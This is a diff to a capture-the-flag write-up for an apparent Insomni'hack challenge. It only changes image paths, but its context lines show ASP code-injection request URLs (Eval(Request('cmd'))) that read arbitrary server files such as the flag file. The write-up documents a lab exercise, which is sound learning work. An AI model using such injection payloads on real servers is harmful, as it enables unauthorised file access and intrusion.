@@ -30,7 +30,7 @@ Then, we read the content of `C:\temp\dir.txt` with:
 ```shell
 http://vbaby.insomni.hack/Default.asp?page=%26Eval(Request("cmd"))&cmd=CreateObject("scripting.FileSystemObject").OpenTextFile("C:\temp\dir.txt").ReadAll
 ```
-![Reading C folder]({{ site.url }}/assets/reading-c-folder.png)
+![Reading C folder](/assets/reading-c-folder.png)
 
 And we find out that the flag is stored within `C:\this_file_contains_the_flags_guys.txt`.
 
@@ -38,4 +38,4 @@ This final request allows us to grab the flag:
 ```shell
 http://vbaby.insomni.hack/Default.asp?page=%26Eval(Request("cmd"))&cmd=CreateObject("scripting.FileSystemObject").OpenTextFile("C:\this_file_contains_the_flag_guys.txt").ReadAll
 ```
-![Reading flag]({{ site.url }}/assets/reading-flag.png)
+![Reading flag](/assets/reading-flag.png)
